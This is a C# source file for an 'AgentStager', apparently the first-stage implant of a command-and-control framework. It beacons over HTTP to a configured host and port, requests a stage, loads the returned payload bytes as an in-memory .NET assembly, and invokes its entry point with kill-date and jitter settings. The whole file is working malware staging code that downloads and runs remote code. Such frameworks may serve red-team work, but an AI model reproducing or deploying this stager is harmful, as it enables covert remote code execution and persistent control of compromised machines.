using System;
using System.Reflection;

class AgentStager
{
    static StagerStatus StagerStatus = StagerStatus.Staging;

    static string AgentID;

    static readonly string ConnectHost = "127.0.0.1";
    static readonly int ConnectPort = 8080;
    static readonly int SleepInterval = 1;
    static readonly int SleepJitter = 0;
    
    static DateTime KillDate = DateTime.Parse("01/01/2030 00:00:00");

    public AgentStager()
    {
        Execute();
    }

    static void Main(string[] args)
    {
        new AgentStager();
    }

    public static void Execute()
    {
        AgentID = Misc.GeneratePseudoRandomString(8);

        var crypto = new CryptoController();

        try
        {
            var commModule = new HttpCommModule(AgentID, ConnectHost, ConnectPort, SleepInterval, SleepJitter);
            commModule.Start(crypto);
            commModule.SendStageRequest();

            while (StagerStatus == StagerStatus.Staging)
            {
                if (commModule.RecvData(out AgentMessage message))
                {
                    if (message.Data.Command.Equals("StageOne", StringComparison.OrdinalIgnoreCase))
                    {
                        StagerStatus = StagerStatus.Staged;
                        commModule.Stop();

                        var asm = Assembly.Load(message.Data.Data);
                        var type = asm.GetType("AgentStage");
                        var instance = Activator.CreateInstance(type);
                        type.InvokeMember(
                            "HttpEntryPoint",
                            BindingFlags.Public | BindingFlags.Static | BindingFlags.InvokeMethod,
                            null,
                            instance,
                            new object[] { AgentID, KillDate, ConnectHost, ConnectPort, SleepInterval, SleepJitter });
                    }
                }
            }
        }
        catch (Exception e)
        {
            Console.Error.WriteLine(e.StackTrace);
        }
    }
}